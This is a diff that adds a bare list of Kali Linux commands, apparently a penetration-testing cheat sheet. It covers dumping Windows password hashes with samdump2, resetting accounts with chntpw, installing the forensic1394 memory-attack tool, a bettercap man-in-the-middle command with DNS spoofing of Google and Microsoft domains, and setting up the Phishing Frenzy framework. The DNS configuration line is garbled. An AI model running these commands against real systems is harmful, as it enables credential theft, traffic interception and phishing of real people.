@@ -1,0 +1,33 @@
+samdump2
+mkdir /mnt/target1
+mount /dev/sda2 /mnt/target1  
+samdump2 SYSTEM SAM
+chntpw
+chntpw -l <sam file>
+chntpw -u <user><sam file>
+apt-get install git cmake g++ python3 python3-pip
+git clone https://github.com/wertarbyte/forensic1394
+cd forensic1394/
+cmake CMakeLists.txt
+sudo make install
+cd python/
+python3 setup.py install  
+root@kali:~rm /etc/ssh/ssh_host_*
+root@kali:~dpkg-reconfigure openssh-server
+root@kali:~ service ssh restart 
+bettercap -I eth0 -O log.txt -X --gateway 192.168.0.1 --target 192.168.0.116  --dns dns.conf 
+  ---- DNS conf file - contents (local .*google\.com # redirect *.microsoft.com to 192.168.0.116, 192.168.0.116 .*microsoft\.com ))
+ git clone https://github.com/pentestgeek/phishing-frenzy.git      
+/var/www/phishing-frenzy
+curl -sSL https://get.rvm.io | bash
+rvm install 2.1.5
+rvm all do gem install --no-rdoc --no-ri rails
+rvm all do gem install --no-rdoc --no-ri passenger
+apt-get install apache2-dev libapr1-dev libaprutil1-dev libcurl4-openssl-dev
+passenger-install-apache2-module
+wget http://download.redis.io/releases/redis-stable.tar.gz
+tar xzf redis-stable.tar.gz
+cd redis-stable
+make && make install
+cd utils
+./install_server.sh
